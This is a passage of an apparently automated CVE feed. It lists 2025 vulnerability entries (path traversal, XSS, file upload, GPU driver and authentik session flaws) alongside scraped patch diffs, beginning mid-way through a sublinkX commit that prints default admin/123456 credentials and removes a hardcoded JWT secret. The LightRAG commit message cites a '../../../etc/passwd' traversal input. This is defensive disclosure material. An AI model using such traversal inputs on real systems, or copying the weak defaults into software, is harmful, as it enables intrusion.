+    execute_command cp "$0" "/usr/bin/sublink"
+    execute_command chmod +x "/usr/bin/sublink"
 
+    echo -e "${GREEN}--- 安装完成 ---${NC}"
+    echo -e "${GREEN}默认账号admin, 密码123456 (如果数据库是新的)。${NC}"
+    echo -e "${GREEN}默认端口8000。${NC}"
+    echo -e "${GREEN}服务已启动并已设置为开机启动。${NC}"
+    echo -e "${GREEN}现在输入 'sublink' 可以呼出菜单进行管理。${NC}"
+    echo -e "${NC}按任意键进入菜单...${NC}"
+    read -n 1 -s
+}
+
+# --- 脚本入口点 ---
+
+# 如果没有安装 Go 程序，则执行安装
+if [ ! -f "$INSTALL_DIR/$BINARY_NAME" ] || [ ! -f "$SERVICE_FILE" ]; then
+    install_sublink
+fi
 
-# 下载menu.sh并设置权限
-curl -o /usr/bin/sublink -H "Cache-Control: no-cache" -H "Pragma: no-cache" https://raw.githubusercontent.com/gooaclok819/sublinkX/main/menu.sh
-chmod 755 "/usr/bin/sublink"
+# 循环显示菜单
+while true; do
+    show_menu
+    handle_menu_option
+done
\ No newline at end of file
diff --git a/main.go b/main.go
index bc38ad1..4348780 100644
--- a/main.go
+++ b/main.go
@@ -26,6 +26,7 @@ var embeddedFiles embed.FS
 //go:embed template
 var Template embed.FS
 
+// 版本号
 var version string
 
 func Templateinit() {
@@ -69,10 +70,13 @@ func Templateinit() {
 }
 
 func main() {
-	var port int
+	// 初始化配置
+	models.ConfigInit()
+	config := models.ReadConfig() // 读取配置文件
+	var port = config.Port        // 读取端口号
 	// 获取版本号
 	var Isversion bool
-	version = "1.8"
+	version = "1.9"
 	flag.BoolVar(&Isversion, "version", false, "显示版本号")
 	flag.Parse()
 	if Isversion {
@@ -85,7 +89,6 @@ func main() {
 	args := os.Args
 	// 如果长度小于2则没有接收到任何参数
 	if len(args) < 2 {
-		port = 8000
 		Run(port)
 		return
 	}
@@ -104,6 +107,9 @@ func main() {
 		return
 	case "run":
 		settingCmd.Parse(args[2:])
+		models.SetConfig(models.Config{
+			Port: port,
+		}) // 设置端口
 		Run(port)
 	default:
 		return
diff --git a/menu.sh b/menu.sh
deleted file mode 100644
index 00c5db0..0000000
--- a/menu.sh
+++ /dev/null
@@ -1,166 +0,0 @@
-#!/bin/bash
-function Up {
-    # 获取最新的发行版标签
-    latest_release=$(curl --silent "https://api.github.com/repos/gooaclok819/sublinkX/releases/latest" | grep '"tag_name":' | sed -E 's/.*"([^"]+)".*/\1/')
-    echo "最新版本: $latest_release"
-    # 检测机器类型
-    machine_type=$(uname -m)
-
-    if [ "$machine_type" = "x86_64" ]; then
-        file_name="sublink_amd64"
-    elif [ "$machine_type" = "aarch64" ]; then
-        file_name="sublink_arm64"
-    else
-        echo "不支持的机器类型: $machine_type"
-        exit 1
-    fi
-
-    # 下载文件
-    curl -LO "https://github.com/gooaclok819/sublinkX/releases/download/$latest_release/$file_name"
-
-    # 设置文件为可执行
-    chmod +x $file_name
-
-    # 移动文件到指定目录
-    mv $file_name "$INSTALL_DIR/sublink"
-    echo "更新完成"
-
-}
-function Select {
-    # 获取最新的发行版标签
-    latest_release=$(curl --silent "https://api.github.com/repos/gooaclok819/sublinkX/releases/latest" | grep '"tag_name":' | sed -E 's/.*"([^"]+)".*/\1/')
-    # 获取服务状态
-    cd /usr/local/bin/sublink # 进入sublink目录
-    status=$(systemctl is-active sublink)
-    version=$(./sublink --version)
-    echo "最新版本:$latest_release"
-    echo "当前版本:$version"
-    # 判断服务状态并打印
-    if [ "$status" = "active" ]; then
-        echo "当前运行状态: 已运行"
-    else
-        echo "当前运行状态: 未运行"
-    fi
-    echo "1. 启动服务"
-    echo "2. 停止服务"
-    echo "3. 卸载安装"
-    echo "4. 查看服务状态"
-    echo "5. 查看运行目录"
-    echo "6. 修改端口"
-    echo "7. 更新"
-    echo "8. 重置账号密码"
-    echo "0. 退出"
-    echo -n "请选择一个选项: "
-    read option
-
-    case $option in
-        1)
-            systemctl start sublink
-            systemctl daemon-reload
-            ;;
-        2)
-            systemctl stop sublink
-            systemctl daemon-reload
-            ;;
-        3)
-            # 停止服务之前检查服务是否存在
-            if systemctl is-active --quiet sublink; then
-                systemctl stop sublink
-            fi
-            if systemctl is-enabled --quiet sublink; then
-                systemctl disable sublink
-            fi
-            # 删除服务文件
-            read -p "是否删除systemd服务文件(包含端口设置)(y/n): " isDelSystemd
-            if [ "$isDelSystemd" = "y" ]; then
-                sudo rm /etc/systemd/system/sublink.service
-            fi
-            # 删除相关文件和目录
-            sudo rm -r /usr/local/bin/sublink/sublink
-            sudo rm -r /usr/bin/sublink
-            read -p "是否删除模板文件和数据库(y/n): " isDelete
-            if [ "$isDelete" = "y" ]; then
-                sudo rm -r /usr/local/bin/sublink/db
-                sudo rm -r /usr/local/bin/sublink/template
-                sudo rm -r /usr/local/bin/sublink/logs
-            fi
-            echo "卸载完成"
-            ;;
-        4)
-            systemctl status sublink
-            ;;
-        5)
-            echo "运行目录: /usr/local/bin/sublink"
-            echo "需要备份的目录为db,template目录为模版文件可备份可不备份"
-            cd /usr/local/bin/sublink
-            ;;
-        6)
-            SERVICE_FILE="/etc/systemd/system/sublink.service"
-            read -p "请输入新的端口号: " Port
-            echo "新的端口号: $Port"
-            PARAMETER="run --port $Port"
-            # 检查服务文件是否存在
-            if [ ! -f "$SERVICE_FILE" ]; then
-                echo "服务文件不存在: $SERVICE_FILE"
-                exit 1
-            fi
-
-            # 检查 ExecStart 是否已经包含该参数
-            if grep -q "run --port" "$SERVICE_FILE"; then
-                echo "参数已存在，正在替换..."
-                # 使用 sed 替换 ExecStart 行中的 -port 参数
-                sudo sed -i "s/-port [0-9]\+/-port $Port/" "$SERVICE_FILE"
-            else
-                # 如果没有 -port 参数，添加新参数
-                # 使用 sed 替换 ExecStart 行，添加启动参数
-                sudo sed -i "/^ExecStart=/ s|$| $PARAMETER|" "$SERVICE_FILE"
-                echo "参数已添加到 ExecStart 行: $PARAMETER"
-            fi
-
-            # 重新加载 systemd 守护进程
-            sudo systemctl daemon-reload
-            # 重启 sublink 服务
-            sudo systemctl restart sublink
-
-            echo "服务已重启。"
-
-            ;;
-        7)
-            # 停止服务之前检查服务是否存在
-            if systemctl is-active --quiet sublink; then
-                systemctl stop sublink
-            fi
-            # 检查是否为最新版本
-            if [[ $version = $latest_release ]]; then
-                echo "当前已经是最新版本"
-            else
-                Up
-            fi
-            # 更新菜单
-            sudo rm /usr/bin/sublink
-            curl -o /usr/bin/sublink -H "Cache-Control: no-cache" -H "Pragma: no-cache" https://raw.githubusercontent.com/gooaclok819/sublinkX/main/menu.sh
-            chmod 755 "/usr/bin/sublink"
-            ;;
-        8)
-            read -p "请输入新的账号: " User
-            read -p "请输入新的密码: " Password
-            # 运行二进制文件并传递启动参数，放在后台运行
-            cd /usr/local/bin/sublink
-            ./sublink setting --username "$User" --password "$Password" &
-            # 获取该程序的PID
-            pid=$!
-            # 等待程序完成
-            wait $pid
-            # 如果需要可以在此处进行清理
-            systemctl restart sublink
-            ;;
-        0)
-            exit 0
-            ;;
-        *)
-            echo "无效的选项,请重新选择"
-            Select
-            ;;
-    esac
-}
-Select
diff --git a/middlewares/jwt.go b/middlewares/jwt.go
index 203cf41..d944f49 100644
--- a/middlewares/jwt.go
+++ b/middlewares/jwt.go
@@ -4,12 +4,16 @@ import (
 	"errors"
 	"net/http"
 	"strings"
+	"sublink/models"
 
 	"github.com/dgrijalva/jwt-go"
 	"github.com/gin-gonic/gin"
 )
 
-var Secret = []byte("sublink") // 秘钥
+// 随机密钥
+
+// var Secret = []byte("sublink") // 秘钥
+var Secret = []byte(models.ReadConfig().JwtSecret) // 从配置文件读取JWT密钥
 
 // JwtClaims jwt声明
 type JwtClaims struct {
diff --git a/models/config.go b/models/config.go
index 9af2c72..f39f571 100644
--- a/models/config.go
+++ b/models/config.go
@@ -1,7 +1,89 @@
 package models
 
+import (
+	"fmt"
+	"log"
+	"os"
+	"sublink/utils"
+
+	"gopkg.in/yaml.v3"
+)
+
+// type Config struct {
+// 	ID    int
+// 	Key   string
+// 	Value string
+// }
+
+// Config 配置结构体
 type Config struct {
-	ID    int
-	Key   string
-	Value string
+	JwtSecret  string `yaml:"jwt_secret"`  // JWT密钥
+	ExpireDays int    `yaml:"expire_days"` // 过期天数
+	Port       int    `yaml:"port"`        // 端口号
+}
+
+var comment string = `# jwt_secret: JWT密钥
+# expire_days: token 过期天数
+# port: 启动端口
+`
+
+// 初始化配置
+func ConfigInit() {
+	// 检查配置文件是否存在
+	if _, err := os.Stat("./db/config.yaml"); os.IsNotExist(err) {
+		R := utils.RandString(31) // 生成随机字符串作为JWT密钥
+		// 如果不存在则创建默认配置文件
+		defaultConfig := Config{
+			JwtSecret:  R, // 生成随机JWT密钥
+			ExpireDays: 14,
+			Port:       8000, // 默认端口
+		}
+
+		// 生成yaml文件
+		data, err := yaml.Marshal(&defaultConfig)
+		if err != nil {
+			log.Println("生成默认配置文件失败:", err)
+			return
+		}
+		data = []byte(comment + string(data)) // 添加注释
+		err = os.WriteFile("./db/config.yaml", data, 0644)
+		if err != nil {
+			fmt.Println("写入文件失败:", err)
+			return
+		}
+		log.Println("配置文件不存在，已创建默认配置文件")
+	}
+}
+
+// 读取配置
+func ReadConfig() Config {
+	file, err := os.ReadFile("./db/config.yaml")
+	if err != nil {
+		log.Println(err)
+	}
+	cfg := Config{}
+	yaml.Unmarshal(file, &cfg)
+	return cfg
+}
+
+// 设置配置
+func SetConfig(newCfg Config) {
+	oldCfg := ReadConfig() // 读取旧的配置文件
+	// 覆盖新的字段
+	if newCfg.JwtSecret != "" {
+		oldCfg.JwtSecret = newCfg.JwtSecret
+	}
+	if newCfg.ExpireDays != 0 {
+		oldCfg.ExpireDays = newCfg.ExpireDays
+	}
+	if newCfg.Port != 0 {
+		oldCfg.Port = newCfg.Port
+	}
+	// 写入文件
+	data, err := yaml.Marshal(&oldCfg)
+	if err != nil {
+		log.Println(err)
+	}
+	data = []byte(comment + string(data)) // 添加注释
+	os.WriteFile("./db/config.yaml", data, 0644)
 }
diff --git a/models/subcription.go b/models/subcription.go
index 6f92200..60aa2dc 100644
--- a/models/subcription.go
+++ b/models/subcription.go
@@ -1,71 +1,154 @@
 package models
 
+import (
+	// 用于将配置解析为结构体
+	"strings" // 用于处理逗号分隔的字符串
+	"time"    // 用于 CreateDate，推荐使用 time.Time
+)
+
+// Subcription 结构体
 type Subcription struct {
-	ID         int
-	Name       string
-	Config     string    `gorm:"embedded"`
-	Nodes      []Node    `gorm:"many2many:subcription_nodes;"` // 多对多关系
-	SubLogs    []SubLogs `gorm:"foreignKey:SubcriptionID;"`    //
... [truncated]

================================================================================


CVE ID: CVE-2025-6773
Published: 2025-06-27T19:15:31.737
Modified: 2025-06-30T18:38:23.493
CVSS Score: 5.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

Description:
A vulnerability was found in HKUDS LightRAG up to 1.3.8. It has been declared as critical. Affected by this vulnerability is the function upload_to_input_dir of the file lightrag/api/routers/document_routes.py of the component File Upload. The manipulation of the argument file.filename leads to path traversal. It is possible to launch the attack on the local host. The identifier of the patch is 60777d535b719631680bcf5d0969bdef79ca4eaf. It is recommended to apply a patch to fix this issue.

References (6):
  1. https://github.com/HKUDS/LightRAG/commit/60777d535b719631680bcf5d0969bdef79ca4eaf
  2. https://github.com/HKUDS/LightRAG/issues/1692
  3. https://github.com/HKUDS/LightRAG/issues/1692#issuecomment-3009368235
  4. https://vuldb.com/?ctiid.314089
  5. https://vuldb.com/?id.314089
  6. https://vuldb.com/?submit.601276

Attempting to extract code examples from references...

--- Code from https://github.com/HKUDS/LightRAG/commit/60777d535b719631680bcf5d0969bdef79ca4eaf ---
From 60777d535b719631680bcf5d0969bdef79ca4eaf Mon Sep 17 00:00:00 2001
From: yangdx <gzdaniel@me.com>
Date: Fri, 27 Jun 2025 02:33:05 +0800
Subject: [PATCH] fix: prevent Path Traversal vulnerability in upload endpoint

- Add sanitize_filename() function to validate and clean uploaded filenames
- Remove path separators, traversal sequences, and control characters
- Verify final paths stay within input directory using Path.resolve()
- Return HTTP 400 errors for unsafe filenames
- Prevents directory traversal attacks like ../../../etc/passwd
---
 lightrag/api/routers/document_routes.py | 54 +++++++++++++++++++++++--
 1 file changed, 50 insertions(+), 4 deletions(-)

diff --git a/lightrag/api/routers/document_routes.py b/lightrag/api/routers/document_routes.py
index fba5c3e8a0..429820a5f8 100644
--- a/lightrag/api/routers/document_routes.py
+++ b/lightrag/api/routers/document_routes.py
@@ -62,6 +62,49 @@ def format_datetime(dt: Any) -> Optional[str]:
 temp_prefix = "__tmp__"
 
 
+def sanitize_filename(filename: str, input_dir: Path) -> str:
+    """
+    Sanitize uploaded filename to prevent Path Traversal attacks.
+    
+    Args:
+        filename: The original filename from the upload
+        input_dir: The target input directory
+        
+    Returns:
+        str: Sanitized filename that is safe to use
+        
+    Raises:
+        HTTPException: If the filename is unsafe or invalid
+    """
+    # Basic validation
+    if not filename or not filename.strip():
+        raise HTTPException(status_code=400, detail="Filename cannot be empty")
+    
+    # Remove path separators and traversal sequences
+    clean_name = filename.replace('/', '').replace('\\', '')
+    clean_name = clean_name.replace('..', '')
+    
+    # Remove control characters and null bytes
+    clean_name = ''.join(c for c in clean_name if ord(c) >= 32 and c != '\x7f')
+    
+    # Remove leading/trailing whitespace and dots
+    clean_name = clean_name.strip().strip('.')
+    
+    # Check if anything is left after sanitization
+    if not clean_name:
+        raise HTTPException(status_code=400, detail="Invalid filename after sanitization")
+    
+    # Verify the final path stays within the input directory
+    try:
+        final_path = (input_dir / clean_name).resolve()
+        if not final_path.is_relative_to(input_dir.resolve()):
+            raise HTTPException(status_code=400, detail="Unsafe filename detected")
+    except (OSError, ValueError):
+        raise HTTPException(status_code=400, detail="Invalid filename")
+    
+    return clean_name
+
+
 class ScanResponse(BaseModel):
     """Response model for document scanning operation
 
@@ -986,18 +1029,21 @@ async def upload_to_input_dir(
             HTTPException: If the file type is not supported (400) or other errors occur (500).
         """
         try:
-            if not doc_manager.is_supported_file(file.filename):
+            # Sanitize filename to prevent Path Traversal attacks
+            safe_filename = sanitize_filename(file.filename, doc_manager.input_dir)
+            
+            if not doc_manager.is_supported_file(safe_filename):
                 raise HTTPException(
                     status_code=400,
                     detail=f"Unsupported file type. Supported types: {doc_manager.supported_extensions}",
                 )
 
-            file_path = doc_manager.input_dir / file.filename
+            file_path = doc_manager.input_dir / safe_filename
             # Check if file already exists
             if file_path.exists():
                 return InsertResponse(
                     status="duplicated",
-                    message=f"File '{file.filename}' already exists in the input directory.",
+                    message=f"File '{safe_filename}' already exists in the input directory.",
                 )
 
             with open(file_path, "wb") as buffer:
@@ -1008,7 +1054,7 @@ async def upload_to_input_dir(
 
             return InsertResponse(
                 status="success",
-                message=f"File '{file.filename}' uploaded successfully. Processing will continue in background.",
+                message=f"File '{safe_filename}' uploaded successfully. Processing will continue in background.",
             )
         except Exception as e:
             logger.error(f"Error /documents/upload: {file.filename}: {str(e)}")


================================================================================


CVE ID: CVE-2025-6772
Published: 2025-06-27T19:15:31.500
Modified: 2025-09-15T13:53:08.687
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

Description:
A vulnerability was found in eosphoros-ai db-gpt up to 0.7.2. It has been classified as critical. Affected is the function import_flow of the file /api/v2/serve/awel/flow/import. The manipulation of the argument File leads to path traversal. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used.

References (4):
  1. https://github.com/eosphoros-ai/DB-GPT/issues/2774 [Exploit, Issue Tracking]
  2. https://vuldb.com/?ctiid.314088 [Permissions Required, VDB Entry]
  3. https://vuldb.com/?id.314088 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.601028 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://github.com/eosphoros-ai/DB-GPT/issues/2774 ---
api/v2/serve/awel/flow/import

api/v2/serve/awel/flow/import

================================================================================


CVE ID: CVE-2025-53093
Published: 2025-06-27T18:15:50.773
Modified: 2025-06-30T18:38:23.493
CVSS Score: 8.6 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
  - CWE-80: CWE-80

Description:
TabberNeue is a MediaWiki extension that allows the wiki to create tabs. Starting in version 3.0.0 and prior to version 3.1.1, any user can insert arbitrary HTMLinto the DOM by inserting a payload into any allowed attribute of the `<tabber>` tag. Version 3.1.1 contains a patch for the bug.

References (6):
  1. https://github.com/StarCitizenTools/mediawiki-extensions-TabberNeue/blob/3a23b703ce36cfc4128e7921841f68230be4059a/includes/Components/TabberComponentTabs.php#L15-L31
  2. https://github.com/StarCitizenTools/mediawiki-extensions-TabberNeue/blob/3a23b703ce36cfc4128e7921841f68230be4059a/includes/Tabber.php#L76
  3. https://github.com/StarCitizenTools/mediawiki-extensions-TabberNeue/blob/3a23b703ce36cfc4128e7921841f68230be4059a/includes/templates/Tabs.mustache#L1
  4. https://github.com/StarCitizenTools/mediawiki-extensions-TabberNeue/commit/4cdf217ef96da74a1503d1dd0bb0ed898fc2a612
  5. https://github.com/StarCitizenTools/mediawiki-extensions-TabberNeue/commit/62ce0fcdf32bd3cfa77f92ff6b940459a14315fa
  6. https://github.com/StarCitizenTools/mediawiki-extensions-TabberNeue/security/advisories/GHSA-jfj7-249r-7j2m

Attempting to extract code examples from references...

--- Code from https://github.com/StarCitizenTools/mediawiki-extensions-TabberNeue/commit/4cdf217ef96da74a1503d1dd0bb0ed898fc2a612 ---
From 4cdf217ef96da74a1503d1dd0bb0ed898fc2a612 Mon Sep 17 00:00:00 2001
From: alistair3149 <alistair31494322@gmail.com>
Date: Fri, 27 Jun 2025 12:48:31 -0400
Subject: [PATCH] fix(security): escape attributes in mustache templates

GHSA-jfj7-249r-7j2m
---
 includes/templates/Tabs.mustache | 4 ++--
 1 file changed, 2 insertions(+), 2 deletions(-)

diff --git a/includes/templates/Tabs.mustache b/includes/templates/Tabs.mustache
index 17b1d39..e4240bb 100644
--- a/includes/templates/Tabs.mustache
+++ b/includes/templates/Tabs.mustache
@@ -1,9 +1,9 @@
-<div {{#array-attributes}} {{key}}="{{{value}}}"{{/array-attributes}}>{{!
+<div {{#array-attributes}} {{key}}="{{value}}"{{/array-attributes}}>{{!
 	}}<header class="tabber__header">{{!
 		}}<button class="tabber__header__prev" tabindex="-1" type="button" aria-hidden="true"></button>{{!
 		}}<nav class="tabber__tabs" role="tablist">{{!
 			}}{{#array-tabs}}{{!
-				}}<a class="tabber__tab" role="tab"{{#array-tab-attributes}} {{key}}="{{{value}}}"{{/array-tab-attributes}}>{{{label}}}</a>{{!
+				}}<a class="tabber__tab" role="tab"{{#array-tab-attributes}} {{key}}="{{value}}"{{/array-tab-attributes}}>{{{label}}}</a>{{!
 			}}{{/array-tabs}}{{!
 		}}</nav>{{!
 		}}<button class="tabber__header__next" tabindex="-1" type="button" aria-hidden="true"></button>{{!


================================================================================


CVE ID: CVE-2025-52207
Published: 2025-06-27T17:15:34.333
Modified: 2025-06-30T18:38:23.493
CVSS Score: 9.9 (CRITICAL) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:L

CWE Categories:
  - CWE-23: CWE-23

Description:
PBXCoreREST/Controllers/Files/PostController.php in MikoPBX through 2024.1.114 allows uploading a PHP script to an arbitrary directory.

References (2):
  1. https://github.com/mikopbx/Core/commit/3ee785429d3f1b33c9ab387ef4221127c9b8c5f3
  2. https://www.mikopbx.com/

Attempting to extract code examples from references...

--- Code from https://github.com/mikopbx/Core/commit/3ee785429d3f1b33c9ab387ef4221127c9b8c5f3 ---
From 3ee785429d3f1b33c9ab387ef4221127c9b8c5f3 Mon Sep 17 00:00:00 2001
From: boffart <5922739+boffart@users.noreply.github.com>
Date: Tue, 3 Jun 2025 17:18:55 +0300
Subject: [PATCH] =?UTF-8?q?=D0=98=D1=81=D0=BA=D0=BB=D1=8E=D1=87=D0=B8?=
 =?UTF-8?q?=D0=BB=20=D0=B2=D0=BE=D0=B7=D0=BC=D0=BE=D0=B6=D0=BD=D0=BE=D1=81?=
 =?UTF-8?q?=D1=82=D1=8C=20=D0=B7=D0=B0=D0=B3=D1=80=D1=83=D0=B7=D0=BA=D0=B8?=
 =?UTF-8?q?=20exploit=20php=20=D1=81=D0=BA=D1=80=D0=B8=D0=BF=D1=82=D0=B0?=
 =?UTF-8?q?=20=D0=B2=20=D0=BF=D1=80=D0=BE=D0=B8=D0=B7=D0=B2=D0=BE=D0=BB?=
 =?UTF-8?q?=D1=8C=D0=BD=D1=83=D1=8E=20=D0=B4=D0=B8=D1=80=D0=B5=D0=BA=D1=82?=
 =?UTF-8?q?=D0=BE=D1=80=D0=B8=D1=8E=20=D1=84=D0=B0=D0=B9=D0=BB=D0=BE=D0=B2?=
 =?UTF-8?q?=D0=BE=D0=B9=20=D1=81=D0=B8=D1=81=D1=82=D0=B5=D0=BC=D1=8B.?=
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit

---
 .../Controllers/Files/PostController.php            | 13 +++++++++++++
 1 file changed, 13 insertions(+)

diff --git a/src/PBXCoreREST/Controllers/Files/PostController.php b/src/PBXCoreREST/Controllers/Files/PostController.php
index 8f08a49a7..61a237e5a 100644
--- a/src/PBXCoreREST/Controllers/Files/PostController.php
+++ b/src/PBXCoreREST/Controllers/Files/PostController.php
@@ -106,6 +106,19 @@ private function uploadFile(): void
                 'resumableTotalChunks' => $this->request->getPost('resumableTotalChunks'),
                 'resumableTotalSize'   => $this->request->getPost('resumableTotalSize'),
             ];
+
+            $identifier = preg_replace(['#[/\\\\]#','/\.\./'], ['',''], $data['resumableIdentifier'])??'';
+            $identifier = trim($identifier);
+            if (!preg_match('/^[a-zA-Z0-9_-]+$/', $identifier)) {
+                $this->sendError(Response::BAD_REQUEST, 'FILE Invalid identifier');
+                return;
+            }
+            if (strlen($identifier) > 255) {
+                $this->sendError(Response::BAD_REQUEST, 'FILE Identifier too long');
+                return;
+            }
+            $data['resumableIdentifier'] = $identifier;
+
             foreach ($this->request->getUploadedFiles() as $file) {
                 $data['files'][]= [
                     'file_path' => $file->getTempName(),


================================================================================


CVE ID: CVE-2025-46708
Published: 2025-06-27T17:15:33.803
Modified: 2025-07-01T18:15:25.280
CVSS Score: 4.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:P/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-280: CWE-280

Description:
Software installed and running inside a Guest VM may conduct improper GPU system calls to prevent other Guests from running work on the GPU.

References (1):
  1. https://www.imaginationtech.com/gpu-driver-vulnerabilities/

Attempting to extract code examples from references...

--- Code from https://www.imaginationtech.com/gpu-driver-vulnerabilities/ ---
pvr_exp_fence

================================================================================


CVE ID: CVE-2025-46707
Published: 2025-06-27T17:15:33.597
Modified: 2025-07-02T15:15:26.797
CVSS Score: 5.2 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N

CWE Categories:
  - CWE-668: CWE-668

Description:
Software installed and running inside a Guest VM may override Firmware's state and gain access to the GPU.

References (1):
  1. https://www.imaginationtech.com/gpu-driver-vulnerabilities/

Attempting to extract code examples from references...

--- Code from https://www.imaginationtech.com/gpu-driver-vulnerabilities/ ---
pvr_exp_fence

================================================================================


CVE ID: CVE-2025-52553
Published: 2025-06-27T15:15:25.143
Modified: 2025-08-21T18:39:24.357
CVSS Score: 9.6 (CRITICAL) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H

CWE Categories:
  - CWE-287: Improper Authentication

Description:
authentik is an open-source identity provider. After authorizing access to a RAC endpoint, authentik creates a token which is used for a single connection and is sent to the client in the URL. This token is intended to only be valid for the session of the user who authorized the connection, however this check is missing in versions prior to 2025.6.3 and 2025.4.3. When, for example, using RAC during a screenshare, a malicious user could access the same session by copying the URL from the shown browser. authentik 2025.4.3 and 2025.6.3 fix this issue. As a workaround, it is recommended to decrease the duration a token is valid for (in the RAC Provider settings, set Connection expiry to `minutes=5` for example). The maintainers of authentik also recommend enabling the option Delete authorization on disconnect.

References (4):
  1. https://github.com/goauthentik/authentik/commit/0e07414e9739b318cff9401a413a5fe849545325 [Patch]
  2. https://github.com/goauthentik/authentik/commit/65373ab21711d58147b5cb9276c5b5876baaa5eb [Patch]
  3. https://github.com/goauthentik/authentik/commit/7100d3c6741853f1cfe3ea2073ba01823ab55caa [Patch]
  4. https://github.com/goauthentik/authentik/security/advisories/GHSA-wr3v-9p2c-chx7 [Vendor Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/goauthentik/authentik/commit/0e07414e9739b318cff9401a413a5fe849545325 ---
From 0e07414e9739b318cff9401a413a5fe849545325 Mon Sep 17 00:00:00 2001
From: Jens L <jens@goauthentik.io>
Date: Fri, 27 Jun 2025 15:26:39 +0200
Subject: [PATCH] security: fix CVE-2025-52553 (#15289)

Signed-off-by: Jens Langhammer <jens@goauthentik.io>
# Conflicts:
#	website/sidebars/docs.mjs
---
 authentik/providers/rac/consumer_client.py   |  5 +++-
 authentik/providers/rac/tests/test_views.py  | 19 ++++++++++++++
 authentik/providers/rac/views.py             |  5 +++-
 website/docs/security/cves/CVE-2025-52553.md | 27 ++++++++++++++++++++
 website/sidebars.js                          |  2 +-
 5 files changed, 55 insertions(+), 3 deletions(-)
 create mode 100644 website/docs/security/cves/CVE-2025-52553.md

diff --git a/authentik/providers/rac/consumer_client.py b/authentik/providers/rac/consumer_client.py
index b55059ec20d0..02221ecfe7d9 100644
--- a/authentik/providers/rac/consumer_client.py
+++ b/authentik/providers/rac/consumer_client.py
@@ -66,7 +66,10 @@ async def disconnect(self, code):
     def init_outpost_connection(self):
         """Initialize guac connection settings"""
         self.token = (
-            ConnectionToken.filter_not_expired(token=self.scope["url_route"]["kwargs"]["token"])
+            ConnectionToken.filter_not_expired(
+                token=self.scope["url_route"]["kwargs"]["token"],
+                session__session__session_key=self.scope["session"].session_key,
+            )
             .select_related("endpoint", "provider", "session", "session__user")
             .first()
         )
diff --git a/authentik/providers/rac/tests/test_views.py b/authentik/providers/rac/tests/test_views.py
index 80778d2ebcd7..39dff1bd3c4a 100644
--- a/authentik/providers/rac/tests/test_views.py
+++ b/authentik/providers/rac/tests/test_views.py
@@ -87,3 +87,22 @@ def test_endpoint_deny(self):
         )
         body = loads(flow_response.content)
         self.assertEqual(body["component"], "ak-stage-access-denied")
+
+    def test_different_session(self):
+        """Test request"""
+        self.client.force_login(self.user)
+        response = self.client.get(
+            reverse(
+                "authentik_providers_rac:start",
+                kwargs={"app": self.app.slug, "endpoint": str(self.endpoint.pk)},
+            )
+        )
+        self.assertEqual(response.status_code, 302)
+        flow_response = self.client.get(
+            reverse("authentik_api:flow-executor", kwargs={"flow_slug": self.flow.slug})
+        )
+        body = loads(flow_response.content)
+        next_url = body["to"]
+        self.client.logout()
+        final_response = self.client.get(next_url)
+        self.assertEqual(final_response.url, reverse("authentik_core:if-user"))
diff --git a/authentik/providers/rac/views.py b/authentik/providers/rac/views.py
index 9babd12733b8..9a09a19e5a3d 100644
--- a/authentik/providers/rac/views.py
+++ b/authentik/providers/rac/views.py
@@ -65,7 +65,10 @@ class RACInterface(InterfaceView):
 
     def dispatch(self, request: HttpRequest, *args: Any, **kwargs: Any) -> HttpResponse:
         # Early sanity check to ensure token still exists
-        token = ConnectionToken.filter_not_expired(token=self.kwargs["token"]).first()
+        token = ConnectionToken.filter_not_expired(
+            token=self.kwargs["token"],
+            session__session__session_key=request.session.session_key,
+        ).first()
         if not token:
             return redirect("authentik_core:if-user")
         self.token = token
diff --git a/website/docs/security/cves/CVE-2025-52553.md b/website/docs/security/cves/CVE-2025-52553.md
new file mode 100644
index 000000000000..36a91fa05fbe
--- /dev/null
+++ b/website/docs/security/cves/CVE-2025-52553.md
@@ -0,0 +1,27 @@
+# CVE-2025-52553
+
+_Reported by [SPIEGEL-Verlag](https://gruppe.spiegel.de)_
+
+## Insufficient Session verification for Remote Access Control endpoint access
+
+### Summary
+
+After authorizing access to a RAC endpoint, authentik creates a token which is used for a single connection and is sent to the client in the URL. This token is intended to only be valid for the session of the user who authorized the connection, however this check is currently missing.
+
+### Patches
+
+authentik 2025.4.3 and 2025.6.3 fix this issue.
+
+### Impact
+
+When for example using RAC during a screenshare, a malicious user could access the same session by copying the URL from the shown browser.
+
+### Workarounds
+
+As a workaround it is recommended to decrease the duration a token is valid for (in the RAC Provider settings, set **Connection expiry** to `minutes=5` for example). We also recommend enabling the option **Delete authorization on disconnect**.
+
+### For more information
+
+If you have any questions or comments about this advisory:
+
+- Email us at [security@goauthentik.io](mailto:security@goauthentik.io).
diff --git a/website/sidebars.js b/website/sidebars.js
index 2ab3506d29df..f13c5b93f7cf 100644
--- a/website/sidebars.js
+++ b/website/sidebars.js
@@ -716,7 +716,7 @@ export default {
                         {
                             type: "category",
                             label: "2025",
-                            items: ["security/cves/CVE-2025-29928"],
+                            items: ["security/cves/CVE-2025-52553", "security/cves/CVE-2025-29928"],
                         },
                         {
                             type: "category",


================================================================================


CVE ID: CVE-2025-6768
Published: 2025-06-27T14:15:58.930
